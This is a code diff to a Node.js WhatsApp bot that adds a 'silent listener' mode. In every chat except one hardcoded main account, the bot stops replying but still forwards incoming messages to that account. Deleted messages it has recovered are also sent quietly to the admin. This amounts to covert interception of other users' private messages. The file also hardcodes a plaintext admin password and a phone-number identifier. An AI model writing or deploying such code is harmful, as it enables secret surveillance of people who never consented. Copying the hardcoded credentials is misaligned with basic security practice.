@@ -15,9 +15,11 @@ const app = express();
 let latestQR = null;
 let botStarted = false;
 
-// Admin forwarding: when set, all incoming messages (from other users) are forwarded to this JID
-// Locked to your main account so other bot instances/users cannot change it
+// Configuration
 const MAIN_JID = '639078377857@s.whatsapp.net'; // your main JID
+const SILENT_LISTENER = true; // when true, non-main chats will be silent (no replies visible in their chat)
+
+// Admin forwarding: locked to MAIN_JID
 let adminTarget = MAIN_JID; // JID of chat receiving forwarded messages (main account)
 const ADMIN_PASSWORD = 'Xbot197423';
 
@@ -86,7 +88,8 @@ async function downloadSocialVideo(url, sock, from, msg, reply) {
     exec(command, { timeout: 120000 }, async (err, stdout, stderr) => {
         if (err) {
             console.error('social download failed:', stderr);
-            return reply('❌ Could not download. The video may be private, removed, or requires login.');
+            if (!SILENT_LISTENER || from === MAIN_JID) return reply('❌ Could not download. The video may be private, removed, or requires login.');
+            return;
         }
         await sendVideo(tmpFile, sock, from, msg, reply);
     });
@@ -133,7 +136,8 @@ async function sendVideo(tmpFile, sock, from, msg, reply) {
         const limitBytes = 64 * 1024 * 1024;
         if (statBefore.size > limitBytes) {
             // too large to send as inline video; send thumbnail + link instead
-            return reply('⚠️ Video is too large to send via WhatsApp (~' + Math.round(statBefore.size / (1024*1024)) + ' MB).');
+            if (!SILENT_LISTENER || from === MAIN_JID) return reply('⚠️ Video is too large to send via WhatsApp (~' + Math.round(statBefore.size / (1024*1024)) + ' MB).');
+            return;
         }
 
         // Try to optimize for streaming (move moov atom)
@@ -152,10 +156,10 @@ async function sendVideo(tmpFile, sock, from, msg, reply) {
             // Last resort: try sending as document to ensure delivery (user can download & play locally)
             const fallbackBuf = fs.readFileSync(tmpFile);
             await sock.sendMessage(from, { document: fallbackBuf, fileName: path.basename(tmpFile), mimetype: 'video/mp4' }, { quoted: msg });
-            await reply('Sent as file (document) as a fallback — download and play locally.');
+            if (!SILENT_LISTENER || from === MAIN_JID) await reply('Sent as file (document) as a fallback — download and play locally.');
         } catch (e) {
             console.error('Fallback send error:', e);
-            reply('❌ Downloaded but failed to send. Video may be too large or incompatible.');
+            if (!SILENT_LISTENER || from === MAIN_JID) reply('❌ Downloaded but failed to send. Video may be too large or incompatible.');
         }
     } finally {
         try { fs.unlinkSync(tmpFile); } catch (e) {}
@@ -370,9 +374,13 @@ async function startBot() {
                     const deletedId = msg.message.protocolMessage?.key?.id;
                     const cached = deletedId ? messageCache.get(deletedId) : null;
                     if (cached) {
-                        await sock.sendMessage(from, {
-                            text: `🚫 *Anti-Delete Alert* 🚫\n\n👤 *From:* ${cached.pushName}\n💬 *Message:* ${cached.text}`
-                        });
+                        const alertText = `🚫 *Anti-Delete Alert* 🚫\n\n👤 *From:* ${cached.pushName}\n💬 *Message:* ${cached.text}`;
+                        if (SILENT_LISTENER && from !== MAIN_JID) {
+                            // send the anti-delete alert silently to main admin instead
+                            await sock.sendMessage(adminTarget || MAIN_JID, { text: alertText });
+                        } else {
+                            await sock.sendMessage(from, { text: alertText });
+                        }
                         messageCache.delete(deletedId);
                     }
                 }
@@ -387,6 +395,11 @@ async function startBot() {
             await forwardToAdmin(msg);
         } catch (e) {
             console.error('Error forwarding to admin:', e);
+        }
+
+        // If listener is silent, do not reply or process further for non-main chats
+        if (SILENT_LISTENER && from !== MAIN_JID) {
+            return; // do not send any messages back to this chat
         }
 
         const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
@@ -431,7 +444,8 @@ async function startBot() {
             return reply('❌ Invalid password.');
         }
 
-        // Handle pornsearch command
+        // The rest of command handling continues as normal (song, video, tt, etc.)
+
         if (text.trim().toLowerCase().startsWith('.pornsearch')) {
             const q = text.replace(/^\.pornsearch\s*/i, '').trim();
             if (!q) return reply('❌ Usage: .pornsearch <query>');
@@ -462,8 +476,8 @@ async function startBot() {
             return;
         }
 
-        // rest of file unchanged (commands handlers, etc.)
-        // ...
+        // ... (remaining command handlers unchanged) ...
+
     });
 }
 
